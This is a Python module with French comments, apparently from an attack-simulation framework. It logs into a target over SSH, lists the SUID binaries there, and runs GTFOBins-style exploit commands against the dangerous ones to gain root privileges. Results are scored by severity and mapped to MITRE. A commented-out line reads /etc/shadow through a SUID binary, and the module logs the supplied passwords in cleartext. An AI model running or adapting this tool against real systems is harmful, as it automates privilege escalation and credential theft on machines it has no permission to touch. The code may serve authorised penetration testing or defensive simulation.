#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu May 21 22:37:54 2026

@author: hounsousamuel

Module d'exploitation des binaires SUID.
Détecte les binaires avec le bit SUID (setuid) activé et tente
d'exploiter les binaires dangereux pour une élévation de privilèges.
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
from typing import List, Dict, Any, Optional
from tactics.execution.command_execution import CommandExecution
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger
from tactics.privilege_escalation.data.suid_binary_helper import SUID_DANGEROUS

logger = get_logger()


class SUIDBinary(CommandExecution):
    """
    Exploitation des binaires SUID sur une cible distante.

    Cette classe permet de :
        1. Rechercher tous les binaires avec le bit SUID activé
        2. Identifier ceux qui sont considérés comme dangereux (GTFOBins)
        3. Tenter d'exécuter des commandes avec les privilèges élevés

    Attributes:
        suid_result (List[Dict]): Liste des résultats d'exploitation.
            Chaque élément contient : binary, name, path, exec_result, success.
    """

    def __init__(
        self, 
        name: str = "suid_binary",
        timeout: int = 2, 
        exec_timeout: int = 5,
        **kwargs
    ):
        """
        Initialise l'exploiteur SUID.

        Args:
            name (str): Nom de l'instance. Par défaut "suid_binary".
            timeout (int): Timeout de connexion SSH en secondes.
            exec_timeout (int): Timeout d'exécution des commandes en secondes.
            **kwargs: Arguments supplémentaires transmis à CommandExecution.
        """
        self.name = name
        super().__init__(name=self.name, **kwargs)
        self.suid_result: List[Dict[str, Any]] = []

    def parse_suid_find(self, output: str) -> List[Dict[str, str]]:
        """
        Parse la sortie de la commande `find` pour extraire les binaires SUID.

        Args:
            output (str): Sortie brute de la commande find contenant les chemins.

        Returns:
            List[Dict[str, str]]: Liste des binaires trouvés avec :
                - path (str): Chemin complet du binaire
                - name (str): Nom du binaire (basename)
        """
        if not output:
            return []
        
        result = []
        seen = set()
        
        for line in output.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            
            path = line.split()[0]
            name = os.path.basename(path)
            
            if name in seen:
                continue
            seen.add(name)
            
            result.append({
                "path": path,
                "name": name,
            })
        
        return result

    async def _exploit_async(
        self,
        ip: str,
        port: str,
        username: str,
        password: str,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Implémentation interne de l'exploitation SUID.

        Étapes :
            1. Exécute `find / -perm -4000 -type f 2>/dev/null` pour lister les SUID
            2. Parse la sortie pour identifier les binaires
            3. Filtre les binaires dangereux via SUID_DANGEROUS
            4. Pour chaque binaire dangereux, tente d'exécuter une commande d'exploitation
            5. Vérifie si l'exécution a réussi

        Args:
            ip (str): IP de la cible.
            port (str): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.

        Returns:
            Dict[str, Any]: Résultat formaté de l'exploitation.
        """
        find_command = "find / -perm -4000 -user root -type f 2>/dev/null"
        
        self.log(f"Début SUID Exploit à : {time.ctime()}, pour ip : {ip} et port {port}", log=True)
        self.log(f"Username: {username}, Password: {password}", log=True)
        self.start_time = time.time()

        exec_result = await self.exec_command_async(
            ip=ip,
            port=port,
            username=username,
            password=password,
            commands=[find_command],
            pkey=pkey
        )

        exec_result = exec_result.get("results", {})

        if exec_result.get("success_number", 0) == 1 and exec_result.get("success_rate", 0) == 1:
            output = exec_result["commands"][find_command]["stdout"]
            binaries = self.parse_suid_find(output)
            
            if binaries:
                self.log(f"Binaires SUID trouvés : {len(binaries)}", log=True)
                dangerous_binaries = []
                for binary in binaries:
                    binary_name = binary["name"]
                    if binary_name in SUID_DANGEROUS:
                        dangerous_binaries.append({
                            **binary,
                            "exploit_cmd": SUID_DANGEROUS[binary_name].format(binary=binary["path"])
                        })
                    # else:
                    #     dangerous_binaries.append({
                    #         **binary,
                    #         "exploit_cmd": f"{binary['path']} cat /etc/shadow 2>&1"
                    #     })
                        self.log(f"  ⚠️ Binaire dangereux trouvé : {binary_name} ({binary['path']})", log=True)
                
                if dangerous_binaries:
                    exploit_commands = []
                    for binary in dangerous_binaries:
                        exploit_commands.append({
                            "original": binary,
                            "cmd": binary["exploit_cmd"]
                        })
                    
                    self.log(f"Exploitation de {len(exploit_commands)} binaires dangereux...", log=True)
                    second_exec_result = await self.exec_command_async(
                        ip=ip,
                        port=port,
                        username=username,
                        password=password,
                        commands=[item["cmd"] for item in exploit_commands],
                        pkey=pkey
                    )
                    
                    if second_exec_result.get("success_number", 0) > 0:
                        commands_result = second_exec_result["results"]["commands"]
                        for item in exploit_commands:
                            cmd = item["cmd"]
                            cmd_result = commands_result.get(cmd, {})
                            original = item["original"]
                            success = not any(
                                x in str(cmd_result["stdout"]).lower().strip()
                                for x in ("ermission non accordée", "permission denied")
                            ) 
                            success = success and len(str(cmd_result["stdout"]).strip()) > 0
                            self.suid_result.append({
                                "binary": original["path"],
                                "name": original["name"],
                                "executed_cmd": cmd,
                                "exec_result": cmd_result,
                                "success": success
                            })
                            
                            if success:
                                self.log(f"  ✅ Exploit réussi : {original['name']}", log=True)
                            else:
                                self.log(f"  ❌ Exploit échoué : {original['name']}", log=True)
                            
                    else:
                        self.log("Aucune commande d'exploitation n'a réussi", log=True)
                else:
                    self.log("Aucun binaire dangereux trouvé", log=True)
            else:
                self.log("Aucun binaire SUID trouvé", log=True)
        else:
            self.log("Échec de la recherche des binaires SUID", log=True)

        self.end_time = time.time()
        self.log(f"Fin SUID Exploit, {len(self.suid_result)} exploit(s) tenté(s)", log=True)
        return self.suid_get_result()

    async def exploit_async(
        self,
        ip: str,
        port: str,
        username: str,
        password: str,
        total_timeout: Optional[float] = None,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Version asynchrone avec timeout global optionnel.

        Args:
            ip (str): IP de la cible.
            port (str): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.
            total_timeout (Optional[float]): Timeout global en secondes.
                Si None, pas de limite de temps.

        Returns:
            Dict[str, Any]: Résultat formaté de l'exploitation.
        """
        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    return await self._exploit_async(ip, port, username, password, pkey=pkey)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
                return self.suid_get_result()
        return await self._exploit_async(ip, port, username, password, pkey=pkey)

    def exploit_sync(self, *args, **kwargs) -> Dict[str, Any]:
        """
        Version synchrone de exploit_async.

        Returns:
            Dict[str, Any]: Résultat formaté de l'exploitation.
        """
        return asyncio.run(self.exploit_async(*args, **kwargs))

    def suid_get_result(self) -> Dict[str, Any]:
        """
        Génère le résultat formaté de l'exploitation.

        Calcule la sévérité en fonction des exploits trouvés :
            - HIGH : Au moins un exploit réussi
            - MEDIUM : Des binaires dangereux trouvés mais aucun succès
            - LOW : Aucun binaire dangereux trouvé

        Returns:
            Dict[str, Any]: Résultat formaté contenant :
                - severity (str): Niveau de sévérité ("HIGH", "MEDIUM", "LOW")
                - elapsed (float): Temps écoulé en secondes
                - mitres (List): Références MITRE ATT&CK
                - results (Dict): Détails des exploits
        """
        self.save()

        mitres = [MITRE.get("SUIDBinary", {})]
        exploit_succeeded = [x for x in self.suid_result if x.get("success", False)]
        
        if len(exploit_succeeded) > 0:
            severity = "HIGH"
        elif len(self.suid_result) > 0:
            severity = "MEDIUM"
        else:
            severity = "LOW"

        results = {
            'severity': severity,
            'elapsed': self.end_time - self.start_time,
            "mitres": mitres,
            'results': {
                "suid_binaries": self.suid_result,
                "success_number": len(exploit_succeeded),
                "success_rate": len(exploit_succeeded) / max(1, len(self.suid_result)),
                "exploit_success": exploit_succeeded,
            },
        }

        return results


# =============================================================================
# Fonction de test
# =============================================================================

def test_suid_exploit(
    ip: str = "172.17.0.2",
    port: int = 22,
    username: str = "root",
    password: str = "toor",
    total_timeout: float = 30.0,
    pkey=None
):
    """
    Teste la classe SUIDBinary sur une cible.

    Args:
        ip (str): IP de la cible.
        port (int): Port SSH.
        username (str): Nom d'utilisateur.
        password (str): Mot de passe.
        total_timeout (float): Timeout total en secondes.
    """
    
    print(f"\n🔐 Test SUIDBinary sur {username}@{ip}:{port}")
    print("-" * 50)
    
    exploit = SUIDBinary(timeout=5, exec_timeout=10)
    result = exploit.exploit_sync(
        ip=ip,
        port=port,
        username=username,
        password=password,
        total_timeout=total_timeout,
        pkey=pkey
    )
    
    severity = result.get("severity", "UNKNOWN")
    success_number = result.get("results", {}).get("success_number", 0)
    suid_binaries = result.get("results", {}).get("suid_binaries", [])
    
    severity_icon = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
    
    print(f"\n{severity_icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {result.get('elapsed', 0):.2f}s")
    print(f"📁 Binaires SUID dangereux : {len(suid_binaries)}")
    print(f"✅ Exploits réussis : {success_number}")
    
    for binary in suid_binaries:
        status = "✅" if binary.get("success") else "❌"
        print(f"   {status} {binary.get('name')} ({binary.get('binary')})")
    
    return result


# if __name__ == "__main__":
#     # Test rapide
#     test_suid_exploit("172.17.0.2", 22, "testuser", "password")